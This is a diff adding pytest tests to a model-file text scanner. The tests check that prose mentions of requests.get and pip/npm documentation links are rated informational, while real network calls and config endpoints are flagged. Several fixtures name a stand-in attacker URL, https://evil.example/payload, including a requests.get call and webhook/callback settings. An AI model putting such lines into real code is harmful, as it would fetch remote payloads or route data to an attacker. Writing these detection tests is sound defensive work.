@@ -364,6 +364,47 @@ def test_text_scanner_documentation_network_api_prose_is_informational(tmp_path:
     assert determine_exit_code(aggregate) == 0
 
 
+@pytest.mark.parametrize(
+    "content",
+    [
+        'print("Use requests.get to download weights")\n',
+        'logger.info("Use requests.get to download weights")\n',
+    ],
+)
+def test_text_scanner_network_api_string_literals_are_informational(tmp_path: Path, content: str) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_function"
+        and check.details.get("function") == "requests.get"
+        and check.severity == IssueSeverity.INFO
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_nested_network_api_call_remains_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text('print(requests.get("https://evil.example/payload"))\n', encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_function"
+        and check.details.get("function") == "requests.get"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
 def test_text_scanner_later_network_api_call_is_not_hidden_by_prose(tmp_path: Path) -> None:
     text_path = tmp_path / "README.md"
     text_path.write_text(
@@ -986,6 +1027,24 @@ def test_text_scanner_documentation_package_manager_prose_remains_informational(
     assert determine_exit_code(aggregate) == 0
 
 
+@pytest.mark.parametrize(
+    "content",
+    [
+        "pip install is documented at https://pip.pypa.io/en/stable/\n",
+        "npm install documentation is covered in https://docs.npmjs.com/\n",
+    ],
+)
+def test_text_scanner_package_install_reference_urls_remain_informational(tmp_path: Path, content: str) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert determine_exit_code(aggregate) == 0
+
+
 def test_text_scanner_pip_general_option_prose_remains_informational(tmp_path: Path) -> None:
     text_path = tmp_path / "README.md"
     text_path.write_text(
@@ -1220,12 +1279,19 @@ def test_text_scanner_documentation_code_like_prose_links_remain_informational(
         '{"endpoint": "https://evil.example/payload"}\n',
         "{'callback': 'https://evil.example/payload'}\n",
         "endpoint:\n  - https://evil.example/payload\n",
+        "endpoints:\n  - https://evil.example/payload\n",
+        "webhooks:\n  - https://evil.example/payload\n",
         '{"webhook_urls": ["https://evil.example/payload"]}\n',
+        'endpointUrl: "https://evil.example/payload"\n',
+        '{"callbackUri": "https://evil.example/payload"}\n',
         "<endpoint>https://evil.example/payload</endpoint>\n",
         'endpoint = {"url": "https://evil.example/payload"}\n',
         'endpoint = {\n  "url": "https://evil.example/payload"\n}\n',
         'callback = {\n  "metadata": "value",\n  "uri": "https://evil.example/payload"\n}\n',
         '- endpoint = "https://evil.example/payload"\n',
+        'const endpoint = "https://evil.example/payload"\n',
+        'let webhook = "https://evil.example/payload"\n',
+        'var callback = "https://evil.example/payload"\n',
         'if enabled: endpoint = "https://evil.example/payload"\n',
         'for item in items: endpoint = "https://evil.example/payload"\n',
         "endpoint:\n  url: https://evil.example/payload\n",
